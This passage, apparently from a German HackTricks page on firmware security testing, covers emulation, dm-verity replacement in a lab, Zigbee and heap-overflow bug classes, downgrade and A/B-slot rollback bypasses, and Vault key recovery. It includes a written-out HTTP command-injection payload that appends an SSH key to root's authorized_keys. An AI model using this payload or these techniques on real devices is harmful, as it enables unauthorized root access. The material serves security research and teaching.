Bei ARM-Binärdateien ist der Vorgang ähnlich; zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Vorgang und unterstützen die dynamische Analyse.

### Rekonstruktion aufgeteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, die Offsets für Inodes, Verzeichnisse oder Fragmenttabellen jedoch unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Analysiere stattdessen das frühe Boot-Binary rückwärts und bilde den von ihm erzeugten Blockgerätegraphen nach: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem aber mit einem `dm-linear`-Mapping erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, selbst wenn alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Bewahre die Arithmetik der Firmware exakt. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Shifts und Abschneidungen in der ursprünglichen Reihenfolge nach; und berücksichtige bankabhängige Endbereiche in A/B-Layouts. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann der angehängte Bereich um einige Kilobyte verschoben werden, wodurch alle nachfolgenden SquashFS-Tabellen beschädigt werden.<sup>[[11]](#references)</sup>

Ein nützlicher Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermittle aus dem Verifier-/Init-Binary Quellgerät, Startsektor und Länge jedes `dm-linear`-Segments.
2. Verkette oder mappe die Bereiche, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuche nur einen kleinen Bereich um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt allein einen plausiblen Superblock zu akzeptieren.
4. Führe ein unverändertes `unsquashfs` auf dem rekonstruierten Image aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten gesteuerter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root gestartet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines statisch gelinktes Init ersetzt wird. Dies ist eine **Ersetzung der Boot-Kette im Labor**, kein Angriff auf dm-verity, dessen RSA-Signatur, Secure Boot oder einen TPM-gebundenen Schlüssel.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die relevanten Abläufe des ursprünglichen Boot-Pfads nachbilden: `devtmpfs` einhängen, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` einhängen, auf das bereitgestellte Blockgerät warten, das bearbeitete Root schreibgeschützt einhängen, die Pseudo-Dateisysteme des alten Roots aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Werden `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt, wird verhindert, dass versehentlich Mount-Punkte aus dem neuen Root ausgehängt werden.<sup>[[11]](#references)</sup>

Halte veränderliche Gerätezustände getrennt vom modifizierten, unveränderlichen Root. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers bewahren, während ein zweiter schreibgeschützter virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Gasts, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlerursache verschleiern. Hänge niemals ein Overlay ein, das eine laufende VM verwendet; mache es mit `qemu-nbd` verfügbar, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Zur reproduzierbaren Fehlerisolierung sollten zeitgestempelte Markerdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und flüchtige Konsolen können durch Ratenbegrenzungen oder den vorzeitigen Abbruch eines Prozesses falsch-negative Ergebnisse liefern. Vergleiche außerdem die exakten Schnittstellen über die verschiedenen Ebenen hinweg, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Generation von Mesa-`libGL` mit der DRI-Treiberschnittstelle (ABI) sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich mit `dlopen()` geladen werden, aber dennoch unbrauchbar bleiben, weil ihr Consumer eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine reale oder eine emulierte Geräteumgebung verwendet. Es ist wichtig, Shell-Zugriff auf das Betriebssystem und das Dateisystem zu behalten. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass die Emulation gelegentlich neu gestartet werden muss. Bei der Analyse sollten das Dateisystem erneut untersucht, öffentlich zugängliche Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erforscht werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken zur Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in deren Betriebsumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und mithilfe von Fuzzing und anderen Techniken Schwachstellen zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger solltest du eine statisch gelinkte Kopie von `gdbserver` auf das Gerät kopieren und remote anhängen:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / Nachrichten-Mapping des Funk-Koprozessors

Bei IoT-Hubs ist der RF-Stack oft auf einen **Radio-MCU** und einen Linux-Userland-Prozess aufgeteilt. Ein hilfreicher Workflow ist, den Pfad nachzuverfolgen:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Parser auf Controller-Seite** auf dem Radio-MCU
3. **Text- oder TLV-Protokoll über Serial/UART**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Ziele für das Reverse Engineering statt nur eines. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Message-Gruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** stammen können und welche vom Controller selbst
- Die exakten **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefinierte `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Bei Zigbee solltest du insbesondere den Pairing-Verkehr erfassen und prüfen, ob das Ziel noch auf den standardmäßigen **Link Key** `ZigBeeAlliance09` setzt. Falls ja, kann das Mitschneiden des Commissioning-Verkehrs den **Network Key** offenlegen. Zigbee 3.0 Install Codes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung ansteuern.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Verfolge den Command Dispatcher zurück, bis du den **nur für den Hersteller bestimmten Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Error-Zweige, die letztlich den vom Angreifer kontrollierten Zustand zurücksetzen oder freigeben.
- Bestätige, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, der fehlerhafte Handler sei immer erreichbar.

Bei zeitkritischen Protokollen kann die Paketwiedergabe mit einem Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Stack in Herstellerqualität nachzubilden, um die korrekten **Endpunkte**, **Attribute** und das richtige Commissioning-Timing bereitzustellen.

### Fehlerklasse: Fragmentierte Downloads in eingebetteten Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurations-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Spätere Fragmente prüfen nur die vom Angreifer kontrollierten **paketlokalen** Felder, zum Beispiel `packet_total_size >= offset + chunk_len`.
3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` verwendet, ohne gegen die **ursprünglich allokierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einer größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht, während der ursprünglich allokierte Buffer weiterhin überläuft.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit ausreichend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell-Download- oder Blob-Download-Zustand zu versetzen.

### Durch das Protokoll ausgelöste `free()`-Aufrufe

In eingebetteten Daemons ist der einfachste Weg, Heap-Metadaten auszunutzen, oft nicht „auf Cleanup warten“, sondern **die protokolleigene Fehlerbehandlung erzwingen**:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-Zustände** zu versetzen.
- Überschreite den Retry-Grenzwert, damit der Daemon den Kontext **zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersagbare `free()`, um allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich gegen **musl/uClibc/dlmalloc-ähnliche** Allokatoren in eingebettetem Linux, bei denen beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Schreib-Primitive verwandeln können. Ein stabiles Muster ist, ein **Size-Feld** zu beschädigen, um die Traversierung des Allokators auf **Fake Chunks innerhalb des übergelaufenen Buffers** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Ausnutzung und Proof of Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in Low-Level-Sprachen. Binäre Laufzeitschutzmechanismen sind in eingebetteten Systemen selten, doch falls vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Ausnutzung (eingebettetes Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake Chunk die Prüfungen bestehen (plausible Größe, `fd = 0` und benachbarte Chunks müssen als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary aber **non-PIE** ist, sind Adressen in `.data/.bss` innerhalb des Binaries stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** umzulenken.
- **NUL-Byte zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsen stoppen und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analysen

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Analyse von Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-Geräten (IoT) unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für Embedded-Sicherheitstests auf Basis von Ubuntu 18.04, vorinstalliert mit Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, fehlt häufig der **Schutz vor Versions-Rollback (Downgrade)**. Wenn der Boot- oder Recovery-Loader lediglich die Signatur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit gültiger Signatur** installieren und so bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Von einem öffentlichen Download-Portal, CDN oder Supportbereich des Herstellers herunterladen.
   * Aus zugehörigen Mobil-/Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` innerhalb eines Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. beziehen.
2. **Das Image über einen verfügbaren Update-Kanal hochladen oder dem Gerät bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Endverbraucher stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und die Recovery bzw. das Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in einer neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional das neueste Image zurückflashen oder Updates deaktivieren, um nach dem Erlangen von Persistenz nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch beliebige Befehle eingeschleust werden können (hier – um SSH-basierten Root-Zugriff mit einem Schlüssel zu ermöglichen). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch da ein Downgrade-Schutz fehlt, ist die Fehlerbehebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind häufig unverschlüsselt in der APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only Anti-Rollback-Bypass in A/B-Slot-Designs

Einige Hersteller implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur innerhalb der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz trotzdem umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem in persistentem Speicher abgelegten Wert und weist ältere signierte Images zurück.
- Der Bootloader **wertet diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbasierten Slot-Zähler gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht in Dual-Slot-Systemen ein **Validate-one-image / boot-another-image-Primitiv**. Kann ein Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren und Slot B anschließend vor dem Neustart zu überschreiben, bootet der Bootloader möglicherweise trotzdem das Downgrade-Image, weil er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den inaktiven Slot hochladen und die normale Validierungs-/Umschaltroutine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahllogik missbrauchen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine überspringen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand veralteter Zustandsdaten statt des **aktuell festgeschriebenen Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen im Userspace oder im Updater-Code, aber **nicht** in ROM- / Bootloader- / Secure-Boot-Stufen.
- Lösch- oder Recovery-Routinen, die einen Slot weiterhin als bootfähig markieren, auch nachdem sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturprüfung durch ROM-Code)?
* Erzwingt der **Bootloader denselben Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten **an den validierten Firmware-Digest/die Firmware-Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Muss das Gerät nach einem erfolgreichen Slot-Wechsel neu starten, oder sind spätere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Punkte, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, eignen sich die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Entschlüsselungsschlüssel für Firmware aus eingebettetem KMS-/Vault-Zustand wiederherstellen

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte zuerst der Container untersucht werden, bevor irgendetwas per Brute-Force angegriffen wird:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` deutet normalerweise auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die verbleibenden Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starker Hinweis auf einen RSA-2048-Ciphertext, der ein zufälliges Firmware-Passwort/einen Sitzungsschlüssel verschlüsselt.
- Abgetrenntes PGP-Material in derselben Datei schützt oft nur die Authentizität. Gehe nicht davon aus, dass es für die Vertraulichkeit zuständig ist.

Wenn die statische Schlüsselsuche (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** zurückentwickelt werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / die Verwaltungs-Binärdatei dekompilieren und nachverfolgen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entschlüsselt und welchen logischen Schlüsselnamen angefordert wird.
- Das extrahierte Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte als gleichwertig mit privatem Schlüsselmaterial behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es meist einfacher, diese Umgebung nachzubilden, als Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem Padding-/Hash-Paar testen, das vom KMS verwendet wird. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene standardmäßige OAEP-Entschlüsselung beweisen **nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Wenn der Payload mit `Salted__` beginnt, den OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, bei älteren Geräten oft MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **die operativen Schlüssel auf Geräteseite wiederherstellen und anschließend die genauen Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Senior-Level-Können, Junior-Level-Autonomie](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der definitive Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in verlassener Hardware ausnutzen – Trail of Bits Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein Smart-Gerät für 20 $ Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Schutzmaßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Zum Blinken bringen: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debuggen und Beheben](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht die Wiederherstellung aus dem SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tool zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security – Hardware-Hacking auffrischen, Teil 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Wie und warum wir die Cypherock-Hardware-Wallet gehackt haben: Die ganze Geschichte](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
